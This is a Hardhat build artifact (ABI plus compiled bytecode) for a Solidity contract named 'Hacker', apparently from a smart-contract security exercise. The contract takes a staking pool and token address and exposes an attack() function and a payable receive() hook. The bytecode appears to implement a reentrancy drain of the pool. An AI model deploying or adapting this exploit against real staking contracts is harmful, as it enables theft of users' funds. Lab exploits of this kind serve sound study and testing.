{
  "_format": "hh-sol-artifact-1",
  "contractName": "Hacker",
  "sourceName": "contracts/Hacker.sol",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_poolContract",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "_tokenAddress",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "owner",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "poolContract",
      "outputs": [
        {
          "internalType": "contract IStakingPool",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "token",
      "outputs": [
        {
          "internalType": "contract IERC20",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "stateMutability": "payable",
      "type": "receive"
    }
  ],
  "bytecode": "0x60a0604052670de0b6b3a764000060005534801561001c57600080fd5b50604051610930380380610930833981810160405281019061003e919061015e565b80600260006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055508173ffffffffffffffffffffffffffffffffffffffff1660808173ffffffffffffffffffffffffffffffffffffffff168152505081600360006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550505061019e565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600061012b82610100565b9050919050565b61013b81610120565b811461014657600080fd5b50565b60008151905061015881610132565b92915050565b60008060408385031215610175576101746100fb565b5b600061018385828601610149565b925050602061019485828601610149565b9150509250929050565b60805161075c6101d460003960008181608a0152818161010e0152818161023e0152818161034d01526103da015261075c6000f3fe6080604052600436106100435760003560e01c806388d52ef7146101a45780638da5cb5b146101cf5780639e5faafc146101fa578063fc0c546a146102115761019f565b3661019f576000600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166370a082317f00000000000000000000000000000000000000000000000000000000000000006040518263ffffffff1660e01b81526004016100c591906104d1565b602060405180830381865afa1580156100e2573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906101069190610527565b111561019d577f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff1663f1fdf46960005460016040518363ffffffff1660e01b815260040161016a9291906105a8565b600060405180830381600087803b15801561018457600080fd5b505af1158015610198573d6000803e3d6000fd5b505050505b005b600080fd5b3480156101b057600080fd5b506101b961023c565b6040516101c69190610626565b60405180910390f35b3480156101db57600080fd5b506101e4610260565b6040516101f191906104d1565b60405180910390f35b34801561020657600080fd5b5061020f610286565b005b34801561021d57600080fd5b5061022661046a565b6040516102339190610662565b60405180910390f35b7f000000000000000000000000000000000000000000000000000000000000000081565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663095ea7b3600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff166000546040518363ffffffff1660e01b815260040161030792919061067d565b6020604051808303816000875af1158015610326573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061034a91906106de565b507f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff1663cb82cc8f6000546040518263ffffffff1660e01b81526004016103a6919061070b565b600060405180830381600087803b1580156103c057600080fd5b505af11580156103d4573d6000803e3d6000fd5b505050507f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff1663f1fdf46960005460016040518363ffffffff1660e01b81526004016104369291906105a8565b600060405180830381600087803b15801561045057600080fd5b505af1158015610464573d6000803e3d6000fd5b50505050565b600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006104bb82610490565b9050919050565b6104cb816104b0565b82525050565b60006020820190506104e660008301846104c2565b92915050565b600080fd5b6000819050919050565b610504816104f1565b811461050f57600080fd5b50565b600081519050610521816104fb565b92915050565b60006020828403121561053d5761053c6104ec565b5b600061054b84828501610512565b91505092915050565b61055d816104f1565b82525050565b6000819050919050565b6000819050919050565b600061059261058d61058884610563565b61056d565b6104f1565b9050919050565b6105a281610577565b82525050565b60006040820190506105bd6000830185610554565b6105ca6020830184610599565b9392505050565b60006105ec6105e76105e284610490565b61056d565b610490565b9050919050565b60006105fe826105d1565b9050919050565b6000610610826105f3565b9050919050565b61062081610605565b82525050565b600060208201905061063b6000830184610617565b92915050565b600061064c826105f3565b9050919050565b61065c81610641565b82525050565b60006020820190506106776000830184610653565b92915050565b600060408201905061069260008301856104c2565b61069f6020830184610554565b9392505050565b60008115159050919050565b6106bb816106a6565b81146106c657600080fd5b50565b6000815190506106d8816106b2565b92915050565b6000602082840312156106f4576106f36104ec565b5b6000610702848285016106c9565b91505092915050565b60006020820190506107206000830184610554565b9291505056fea2646970667358221220606503500afc93ea61ce4df6658a2ba7e3a7448c7ac6930ec743cdcff0cffe8064736f6c63430008120033",
  "linkReferences": {},
  "deployedLinkReferences": {}
}